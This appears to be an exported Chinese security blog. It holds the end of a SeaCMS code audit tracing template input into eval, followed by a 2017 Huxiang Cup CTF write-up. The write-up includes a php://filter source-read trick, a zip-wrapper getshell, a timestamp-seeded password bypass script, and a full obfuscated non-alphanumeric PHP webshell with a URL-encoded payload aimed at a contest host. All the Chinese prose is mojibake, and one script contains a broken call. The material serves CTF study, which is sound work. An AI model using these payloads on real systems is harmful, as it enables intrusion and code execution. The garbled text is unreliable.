<pre><code class="php">preg_match_all($labelRule,$content,$iar);</code></pre>
<pre><code class="php">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</code></pre>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œ$iaræ˜¯åŒ¹é…çš„ç»“æœã€‚buildregxæ˜¯å¯¹æ­£åˆ™è¡¨è¾¾å¼æ ¼å¼åŠ å·¥çš„å‡½æ•°ã€‚</p>
<p>çœ‹ä¸€ä¸‹è¢«åŒ¹é…çš„$contentçš„å†…å®¹ã€‚$contentæ˜¯åœ¨search.phpä¸­è°ƒç”¨å‡½æ•°ä½œä¸ºå‚æ•°è¿‡æ¥çš„ï¼Œå»search.phpæ‰¾ä¸€æ‰¾ã€‚</p>
<pre><code class="php">    if($cfg_iscache)&#123;
        if(chkFileCache($cacheName))&#123;
            $content = getFileCache($cacheName);
        &#125;else&#123;
            $content = parseSearchPart($searchTemplatePath);
            setFileCache($cacheName,$content);
        &#125;
    &#125;else&#123;
            $content = parseSearchPart($searchTemplatePath);
    &#125;</code></pre>
<p>ï¼ˆ117-126è¡Œï¼‰</p>
<p>åœ¨/install/config.cache.ini.phpç¬¬80è¡Œå¯ä»¥çŸ¥é“ï¼Œ$cfg_iscache = â€˜1â€™;ï¼Œé»˜è®¤ä¸º1.ä¸Šé¢å®šä¹‰äº†$searchTemplatePath=/templets/default/html/cascade.html</p>
<p>chkFileCacheå‡½æ•°åœ¨common.func.php2395è¡Œï¼Œæ˜¯ç”¨æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åŒçš„æ–‡ä»¶ã€‚å¦‚æœæœ‰å°±ç›´æ¥ä»æ–‡ä»¶è·å–ï¼Œæ²¡æœ‰å°±æ‰§è¡Œ<code>$content = parseSearchPart($searchTemplatePath);</code>ï¼Œä¸‹é¢190è¡Œæ˜¯parseSearchPartå‡½æ•°ã€‚</p>
<pre><code class="php">function parseSearchPart($templatePath)
&#123;
    global $mainClassObj,$tid;
    $currentTypeId = empty($tid)?0:$tid;
    $content=loadFile(sea_ROOT.$templatePath);
    $content=$mainClassObj-&gt;parseTopAndFoot($content);
    $content=$mainClassObj-&gt;parseAreaList($content);
    $content=$mainClassObj-&gt;parseHistory($content);
    $content=$mainClassObj-&gt;parseSelf($content);
    $content=$mainClassObj-&gt;parseGlobal($content);
    $content=$mainClassObj-&gt;parseMenuList($content,&quot;&quot;,$currentTypeId);
    $content=$mainClassObj-&gt;parseVideoList($content,$currentTypeId);
    $content=$mainClassObj-&gt;parsenewsList($content,$currentTypeId);
    $content=$mainClassObj-&gt;parseTopicList($content);
    return $content;
&#125;</code></pre>
<p>è¿™å‡ ä¸ªå‡½æ•°çš„åŠŸèƒ½éƒ½å·®ä¸å¤šï¼Œcascade.htmlä½œä¸ºä¸€ä¸ªæ¨¡æ¿çš„ä½œç”¨ï¼Œå„ä¸ªå‡½æ•°éƒ½æ˜¯ä¸ºå…¶æ·»åŠ å„è‡ªçš„å†…å®¹çš„</p>
<p>å†å¾€ä¸‹æ¥çœ‹åˆ°ä¸€ä¸ªå¯¹searchtypeçš„åˆ¤æ–­ã€‚</p>
<pre><code class="php">if(intval($searchtype)==5)
    &#123;
        $tname = !empty($tid)?getTypeNameOnCache($tid):&#39;å…¨éƒ¨&#39;;
        $jq = !empty($jq)?$jq:&#39;å…¨éƒ¨&#39;;
        $area = !empty($area)?$area:&#39;å…¨éƒ¨&#39;;
        $year = !empty($year)?$year:&#39;å…¨éƒ¨&#39;;
        $yuyan = !empty($yuyan)?$yuyan:&#39;å…¨éƒ¨&#39;;
        $letter = !empty($letter)?$letter:&#39;å…¨éƒ¨&#39;;
        $state = !empty($state)?$state:&#39;å…¨éƒ¨&#39;;
        $ver = !empty($ver)?$ver:&#39;å…¨éƒ¨&#39;;
        $money = !empty($money)?$money:&#39;å…¨éƒ¨&#39;;
        $content = str_replace(&quot;&#123;searchpage:type&#125;&quot;,$tid,$content);
        $content = str_replace(&quot;&#123;searchpage:typename&#125;&quot;,$tname ,$content);
        $content = str_replace(&quot;&#123;searchpage:year&#125;&quot;,$year,$content);
        $content = str_replace(&quot;&#123;searchpage:area&#125;&quot;,$area,$content);
        $content = str_replace(&quot;&#123;searchpage:letter&#125;&quot;,$letter,$content);
        $content = str_replace(&quot;&#123;searchpage:lang&#125;&quot;,$yuyan,$content);
        $content = str_replace(&quot;&#123;searchpage:jq&#125;&quot;,$jq,$content);
        if($state==&#39;w&#39;)&#123;$state2=&quot;å®Œç»“&quot;;&#125;elseif($state==&#39;l&#39;)&#123;$state2=&quot;è¿è½½ä¸­&quot;;&#125;else&#123;$state2=&quot;å…¨éƒ¨&quot;;&#125;
        if($money==&#39;m&#39;)&#123;$money2=&quot;å…è´¹&quot;;&#125;elseif($money==&#39;s&#39;)&#123;$money2=&quot;æ”¶è´¹&quot;;&#125;else&#123;$money2=&quot;å…¨éƒ¨&quot;;&#125;
        $content = str_replace(&quot;&#123;searchpage:state&#125;&quot;,$state2,$content);
        $content = str_replace(&quot;&#123;searchpage:money&#125;&quot;,$money2,$content);
        $content = str_replace(&quot;&#123;searchpage:ver&#125;&quot;,$ver,$content);
        $content=$mainClassObj-&gt;parsePageList($content,&quot;&quot;,$page,$pCount,$TotalResult,&quot;cascade&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;type&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;year&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;area&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;letter&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;lang&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;jq&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;state&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;ver&quot;);
        $content=$mainClassObj-&gt;parseSearchItemList($content,&quot;money&quot;);
    &#125;else</code></pre>
<p>å¯¹å˜é‡è¿›è¡Œäº†æ˜¯å¦ä¸ºç©ºçš„åˆ¤æ–­ï¼Œä¼ å…¥äº†å‚æ•°å°±ä½¿ç”¨ç”¨æˆ·ä¼ å…¥å€¼å¦åˆ™ä¸ºé»˜è®¤å€¼ã€‚å„å˜é‡è¢«æ›¿æ¢åˆ°æ¨¡æ¿é‡Œé¢ã€‚</p>
<p>è¿™æ—¶å€™$contentå°±æ˜¯åŸæ¥cascade.htmlç»è¿‡æ›¿æ¢ç»„è£…åçš„å†…å®¹ã€‚</p>
<p>è¿™æ—¶å€™contentè¿›å…¥parseIf()å‡½æ•°ï¼Œç»è¿‡<code>preg_match_all($labelRule,$content,$iar);</code>çš„åŒ¹é…åä¼šåŒ¹é…å‡º{if:(.*?)}è¿™ç§å½¢å¼çš„å†…å®¹ä½œä¸º$strIfçš„å€¼ã€‚åœ¨cascade.htmlä¸­å¯ä»¥çœ‹åˆ°è¦åŒ¹é…çš„å†…å®¹</p>
<pre><code class="html">      &lt;dl&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:typeitemlist&#125;&#123;if: [typeitemlist:value]=&#123;searchpage:typename&#125;&#125;&lt;b&gt;&lt;a href=&quot;[typeitemlist:link]&quot;&gt;[typeitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[typeitemlist:link]&quot;&gt;[typeitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:typeitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:areaitemlist&#125;&#123;if: [areaitemlist:value]=&#123;searchpage:area&#125;&#125;&lt;b&gt;&lt;a href=&quot;[areaitemlist:link]&quot;&gt;[areaitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[areaitemlist:link]&quot;&gt;[areaitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:areaitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:yearitemlist&#125;&#123;if: [yearitemlist:value]=&#123;searchpage:year&#125;&#125;&lt;b&gt;&lt;a href=&quot;[yearitemlist:link]&quot;&gt;[yearitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[yearitemlist:link]&quot;&gt;[yearitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:yearitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:letteritemlist&#125;&#123;if: [letteritemlist:value]=&#123;searchpage:letter&#125;&#125;&lt;b&gt;&lt;a href=&quot;[letteritemlist:link]&quot;&gt;[letteritemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[letteritemlist:link]&quot;&gt;[letteritemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:letteritemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:langitemlist&#125;&#123;if: [langitemlist:value]=&#123;searchpage:lang&#125;&#125;&lt;b&gt;&lt;a href=&quot;[langitemlist:link]&quot;&gt;[langitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[langitemlist:link]&quot;&gt;[langitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:langitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:jqitemlist&#125;&#123;if: [jqitemlist:value]=&#123;searchpage:jq&#125;&#125;&lt;b&gt;&lt;a href=&quot;[jqitemlist:link]&quot;&gt;[jqitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[jqitemlist:link]&quot;&gt;[jqitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:jqitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:stateitemlist&#125;&#123;if: [stateitemlist:value]=&#123;searchpage:state&#125;&#125;&lt;b&gt;&lt;a href=&quot;[stateitemlist:link]&quot;&gt;[stateitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[stateitemlist:link]&quot;&gt;[stateitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:stateitemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:veritemlist&#125;&#123;if: [veritemlist:value]=&#123;searchpage:ver&#125;&#125;&lt;b&gt;&lt;a href=&quot;[veritemlist:link]&quot;&gt;[veritemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[veritemlist:link]&quot;&gt;[veritemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:veritemlist&#125;&lt;/dd&gt;
        &lt;dd&gt;&amp;nbsp;&#123;seacms:moneyitemlist&#125;&#123;if: [moneyitemlist:value]=&#123;searchpage:money&#125;&#125;&lt;b&gt;&lt;a href=&quot;[moneyitemlist:link]&quot;&gt;[moneyitemlist:value]&lt;/a&gt;&lt;/b&gt;&#123;else&#125;&lt;a href=&quot;[moneyitemlist:link]&quot;&gt;[moneyitemlist:value]&lt;/a&gt;&#123;end if&#125; &#123;/seacms:moneyitemlist&#125;&lt;/dd&gt;
      &lt;/dl&gt;</code></pre>
<p>åŒ¹é…åˆ°çš„å†…å®¹æ˜¯å½¢å¦‚xx=xxè¿™ç§å½¢å¼ï¼Œä¼šç»è¿‡parseStrIf()å‡½æ•°å¤„ç†ï¼Œçœ‹ä¸Šé¢main.class.phpçš„3099è¡Œã€‚</p>
<pre><code class="php">function parseStrIf($strIf)
        &#123;
                if(strpos($strIf,&#39;=&#39;)===false)
                &#123;
                        return $strIf;
                &#125;
                if((strpos($strIf,&#39;==&#39;)===false)&amp;&amp;(strpos($strIf,&#39;=&#39;)&gt;0))
                &#123;
                        $strIf=str_replace(&#39;=&#39;, &#39;==&#39;, $strIf);
                &#125;
                $strIfArr =  explode(&#39;==&#39;,$strIf);
                return (empty($strIfArr[0])?&#39;NULL&#39;:$strIfArr[0]).&quot;==&quot;.(empty($strIfArr[1])?&#39;NULL&#39;:$strIfArr[1]);
        &#125;</code></pre>
<p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯çœ‹ä¸€ä¸‹åŒ¹é…åˆ°çš„å†…å®¹æœ‰æ²¡æœ‰ç­‰å·ï¼Œæ²¡æœ‰ç›´æ¥è¿”å›ï¼Œæœ‰çš„è¯å°†å•ç­‰å·æ›¿æ¢æˆåŒç­‰å·è¿”å›ã€‚</p>
<p>ç„¶åä½œä¸º$strIfçš„å€¼æ‹¼æ¥è¿›evalæ‰§è¡Œã€‚</p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¹–æ¹˜æ¯å¤èµ›WriteUp</title>
    <url>/2017/11/27/hu-xiang-bei-fu-sai-writeup/</url>
    <content><![CDATA[<h1 id="æ¹–æ¹˜æ¯å¤èµ›WriteUp"><a href="#æ¹–æ¹˜æ¯å¤èµ›WriteUp" class="headerlink" title="æ¹–æ¹˜æ¯å¤èµ›WriteUp"></a>æ¹–æ¹˜æ¯å¤èµ›WriteUp</h1><h2 id="1-æµé‡åˆ†æï¼ˆmiscï¼‰"><a href="#1-æµé‡åˆ†æï¼ˆmiscï¼‰" class="headerlink" title="1.æµé‡åˆ†æï¼ˆmiscï¼‰"></a>1.æµé‡åˆ†æï¼ˆmiscï¼‰</h2><p>wiresharkä¸­HTTPå¯¼å‡ºå¯¹è±¡å‘ç°flag.zip,ä¿å­˜å¾—åˆ°ce.txt,æ‰“å¼€å‘ç°æ˜¯rgbå€¼ï¼Œè„šæœ¬ç”Ÿæˆå›¾ç‰‡ã€‚</p>
<p>è€ƒè™‘åˆ°98457ä¸èƒ½å¼€æ–¹ï¼Œæ‰€ä»¥å›¾ç‰‡å°ºå¯¸ä¸æ˜¯æ­£æ–¹å½¢ï¼Œåº”è¯¥æ˜¯é•¿æ–¹å½¢çš„flagå€¼ï¼Œå› å¼åˆ†è§£å¾—åˆ°3<em>37</em>887.</p>
<p>å®éªŒåé•¿å®½ä¸º887*111.</p>
<pre><code class="python">from PIL import Image
x=887 
y=111
f = open(&quot;ce.txt&quot;, &#39;r&#39;)
RGBInfo = f.readlines()
f.flaglose()
flag = Image.new(&quot;RGB&quot;, (x, y)) 
for i in range(0, x):
    for j in range(0, y):
        rgb = RGBInfo[i * y + j].split(&quot;, &quot;)
        flag.putpixel([i, j],(int(rgb[0]), int(rgb[1]), int(rgb[2])))
flag.show()
flag.save(&quot;D:\Flag.jpg&quot;)
</code></pre>
<h2 id="2-MISC300"><a href="#2-MISC300" class="headerlink" title="2.MISC300"></a>2.MISC300</h2><p>æ ¹æ®ç¬¬äºŒè¡Œçš„Sâ€™The black pixels of a b/w image are atâ€™</p>
<p>è§‚å¯Ÿåˆ°æ–‡ä»¶ä¸­çš„æ•°æ®æ˜¯å…·æœ‰å›ºå®šæ ¼å¼ï¼Œæ˜¯ç»è¿‡pickleæ¨¡å—åºåˆ—åŒ–åçš„ã€‚</p>
<p>ä½¿ç”¨pickleå¯ä»¥å¾—åˆ°åæ ‡åˆ—è¡¨ã€‚(x,y)â€¦â€¦..</p>
<pre><code class="python">import pickle
from PIL import Image
with open(&#39;pixels.jpg.pkl&#39;) as file:
    data = pickle.loads(file.read().encode(&#39;utf8&#39;))
info = [(int(e[0]), int(e[1])) for e in data[1:]]
width  = max([p[0] for p in info]) + 1
height = max([p[1] for p in info]) + 1
flag  = Image.new(&#39;1&#39;,(width, height),0)
point = flag.load()
for pixel in info:
    point[pixel[0], pixel[1]] = 255
flag.show()
flag.save(&quot;D:\Flagg.jpg&quot;)
</code></pre>
<h2 id="3-çƒ­èº«è¿åŠ¨ï¼ˆmiscï¼‰"><a href="#3-çƒ­èº«è¿åŠ¨ï¼ˆmiscï¼‰" class="headerlink" title="3.çƒ­èº«è¿åŠ¨ï¼ˆmiscï¼‰"></a>3.çƒ­èº«è¿åŠ¨ï¼ˆmiscï¼‰</h2><p>åŠ¨å›¾ï¼Œ23ä¸ªå›¾å±‚ï¼Œ8X8æ£‹ç›˜æ ¼ï¼Œå¯¹åº”64è¿›åˆ¶è½¬æ¢ã€‚è§£base64å¾—åˆ°flagã€‚</p>
<p><a href="https://baike.baidu.com/item/%E5%85%AD%E5%8D%81%E5%9B%9B%E8%BF%9B%E5%88%B6/2176107?fr=aladdin">ç™¾åº¦ç™¾ç§‘</a></p>
<pre><code>25 38 49 33 25 55 44 49 29 5 60 49 13 21 61 38 29 22 57 46 30 23 52    
=&gt;ZmxhZ3sxdF8xNV9mdW5ueX0
=&gt;flag&#123;1t_15_funny&#125;    (è§£base64)</code></pre>
<h2 id="4-web200"><a href="#4-web200" class="headerlink" title="4.web200"></a>4.web200</h2><p>opå‚æ•°èƒ½è¯»å–æ‰§è¡ŒåŠŸèƒ½çš„phpï¼Œå°è¯•ç”¨ä¼ªåè®®è¯»å–æºç ã€‚(ç›´æ¥å°±èƒ½è¯»flag.php â€¦â€¦)</p>
<p><code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
<p>å¾—åˆ°æºç ï¼š</p>
<p>home.php</p>
<pre><code class="php">&lt;?php
include &#39;common.php&#39;;
?&gt;
&lt;center&gt;
&lt;div class=&quot;article&quot;&gt;
    &lt;h2&gt;Welcome!!&lt;/h2&gt;
    &lt;p&gt;
        We let you upload PNG image files and store it!&lt;br/&gt;
    &lt;/p&gt;
    &lt;p&gt;
        Get started by &lt;a href=&quot;?op=upload&quot;&gt;uploading a picture&lt;/a&gt;
    &lt;/p&gt;

&lt;/div&gt;
&lt;/center&gt;
</code></pre>
<p>æŒ‡å‘common.php</p>
<pre><code class="php">&lt;?php
if(!defined(&#39;FROM_INDEX&#39;)) die();

define(&#39;MAX_IM_SIZE&#39;, 100);

function create_image_key() &#123;
    return sha1($_SERVER[&#39;REMOTE_ADDR&#39;] . $_SERVER[&#39;HTTP_USER_AGENT&#39;] . time() . mt_rand());
&#125;

function load_image($imagekey) &#123;
    if(1 !== preg_match(&#39;/[0-9a-f]&#123;40&#125;/&#39;, $imagekey)) &#123;
        fatal(&#39;Invalid image key.&#39;);
    &#125;

    $im = imagecreatefrompng(&quot;uploads/&#123;$imagekey&#125;.png&quot;);
    if(!$im) &#123;
        fatal(&#39;Failed to load image.&#39;);
    &#125;
    return $im;
&#125;
stream_wrapper_unregister (&quot;zip&quot;);</code></pre>
<p>å°†ä¸€å¥è¯æ‰“åŒ…å‹ç¼©zipï¼Œå¦‚æœä¸èƒ½ç›´æ¥ä¸Šä¼ å°±æ”¹ä¸€ä¸‹åç¼€ã€‚é€šè¿‡ä¼ªåè®®getshellã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20171127/172506621.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20171127/172520064.png" alt="mark"></p>
<h2 id="5-web150"><a href="#5-web150" class="headerlink" title="5.web150"></a>5.web150</h2><p>â€“by <a href="https://windylh.github.io/">Windylh</a></p>
<p>é€šè¿‡.index.php.swpå¾—åˆ°æºç </p>
<pre><code class="php">&lt;?php
error_reporting(0);
$flag = &quot;*********************&quot;;
echo &quot;please input a rand_num !&quot;;
function create_password($pw_length =  10)&#123;
    $randpwd = &quot;&quot;;
    for ($i = 0; $i &lt; $pw_length; $i++)&#123;
        $randpwd .= chr(mt_rand(100, 200));
    &#125;
    return $randpwd;
&#125;

session_start();

mt_srand(time());

$pwd=create_password();

echo $pwd.&#39;||&#39;;    

if($pwd == $_GET[&#39;pwd&#39;])&#123;
    echo &quot;first&quot;;
    if($_SESSION[&#39;userLogin&#39;]==$_GET[&#39;login&#39;])
        echo &quot;Nice , you get the flag it is &quot;.$flag ;
&#125;else&#123;
    echo &quot;Wrong!&quot;;
&#125;

$_SESSION[&#39;userLogin&#39;]=create_password(32).rand();

?&gt;
</code></pre>
<p>æ ¹æ®æ—¶é—´æˆ³ç”Ÿæˆéšæœºæ•°ç„¶åä¸pwdå‚æ•°å¯¹æ¯”ï¼Œå¯ä»¥ç”¨pythonè„šæœ¬æ¥getflagã€‚</p>
<pre><code class="python">import requests

url=&#39;http://114.215.138.89:10080/&#39;

data=requests.get(url).content
data=data.split(b&#39;||&#39;)[0].split(b&#39;&lt;br&gt;&#39;)[1]

get=&#123;&#39;pwd&#39;:data&#125;
data=requests.get(url,get).content

print data
</code></pre>
<h2 id="6-web300"><a href="#6-web300" class="headerlink" title="6.web300"></a>6.web300</h2><p>é¢˜ç›®æç¤ºgetshellï¼Œå¹¶ä¸”è¿‡æ»¤é¢‡å¤šã€‚</p>
<p>è¦ç”¨ä»…å‰©çš„ç‰¹æ®Šå­—ç¬¦æ„é€ webshellã€‚</p>
<p>webshell</p>
<pre><code class="php">$_=[].&#39;&#39;;$_=$_[&#39;(&#39;==&#39;)&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></pre>
<p>payload</p>
<pre><code class="php">http://114.215.71.135:10080/?content=%24_%3D%5B%5D.%27%27%3B%24_%3D%24_%5B%27%7B%27%3D%3D%27%7D%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B</code></pre>
<p>åˆ°shellé¡µé¢æ‰§è¡Œå‘½ä»¤getflagã€‚</p>
<h2 id="7-ç®€å•çš„å®‰å“é€†å‘"><a href="#7-ç®€å•çš„å®‰å“é€†å‘" class="headerlink" title="7.ç®€å•çš„å®‰å“é€†å‘"></a>7.ç®€å•çš„å®‰å“é€†å‘</h2><p>â€“by <a href="https://windylh.github.io/">Windylh</a></p>
<p>ä¸‹è½½apkï¼Œåç¼–è¯‘ã€‚æŸ¥çœ‹Mainactivityå¾—åˆ°flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20171127/173433403.png" alt="mark"></p>
<h2 id="8-Re4newer"><a href="#8-Re4newer" class="headerlink" title="8.Re4newer"></a>8.Re4newer</h2><p>â€“by NexusHE</p>
<p>æœ¬é¢˜å¤§æ¦‚æ€è·¯å°±æ˜¯åœ¨ç¨‹åºä¸­å­˜å‚¨äº†ä¸€ç³»åˆ—å­—ç¬¦ä¸²ï¼Œå°†å…¶å„ä½ä¸0x22å¼‚æˆ–è®¡ç®—ï¼Œå¹¶å°†å…¶æŒ‰é¡ºåºæ‹¼æ¥èµ·æ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ‹¼æ¥æŒ‰ç…§çš„é¡ºåºæœ‰é—®é¢˜ï¼Œéœ€è¦è‡ªå·±æ ¹æ®è¯­åºæ‹¼æ¥èµ·æ¥</p>
<pre><code class="c">#include &lt;stdio.h&gt;

int main() &#123;
    int v2 = 43;
    int v[100] = &#123;
0x5F,0x56,0x13,0x7D, //_1t&#125;
0x71,0x51,0x63,0x52,
0x7D,0x57,0x7D,0x67,
0x67,0x67,0x70,0x70,
0x70,0x7D,0x47,0x4E, //le_R
0x52,0x4F,0x4B,0x51, //simp
0x7D,0x5B,0x50,0x11, //3ry_
0x54,0x7D,0x63,0x7D, //_A_v
0x71,0x4B,0x7D,0x51, //s_iS
0x13,0x4A,0x76,0x59, //&#123;Th1
0x45,0x43,0x4E,0x44, //flag
&#125;;
    do &#123;
        printf(&quot;%c&quot;, v[v2] ^ 0x22);
        v2--;
    &#125;
    while(v2 &gt; -1);
    return 0;
&#125;
</code></pre>
<h2 id="9-Encryptor-apk"><a href="#9-Encryptor-apk" class="headerlink" title="9.Encryptor.apk"></a>9.Encryptor.apk</h2><p>â€“by  NexusHE</p>
<p>æœ¬é¢˜å¤§æ¦‚æ˜¯ä¸€ä¸ªæ–‡ä»¶åŠ å¯†çš„apkï¼Œå…ˆæ˜¯æœ‰ä¸€ä¸ªå†…ç½®çš„å¯†ç â€Passwordâ€ï¼Œè®¡ç®—å…¶MD5å€¼ï¼Œå°†å…¶æŒ‰ä½å–å€¼ä¸å¾…åŠ å¯†çš„æ–‡ä»¶å­—èŠ‚åšå¼‚æˆ–è¿ç®—ï¼Œå†å¦å­˜åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ã€‚å°†å…¶é€†å‘å¤„ç†ï¼Œä¾¿è·å¾—æºæ–‡ä»¶ã€‚</p>
<pre><code class="java">import java.io.*;
import java.nio.*;
import java.security.*;
import java.util.*;

public class script &#123;
    public static void main(String[] args) throws Exception&#123;
        String password = &quot;Password&quot;;
        String path = &quot;flag.encrypted&quot;;
        byte[] file1 = toByteArray(path);
        MessageDigest localMessageDigest = MessageDigest.getInstance(&quot;MD5&quot;);
        localMessageDigest.reset();
        localMessageDigest.update(password.getBytes());
        byte[] pass = localMessageDigest.digest();
        byte[] f2 = decrypt(file1, pass);
        File file2 = new File(&quot;x.jpg&quot;);
        FileOutputStream fos = new FileOutputStream(file2);
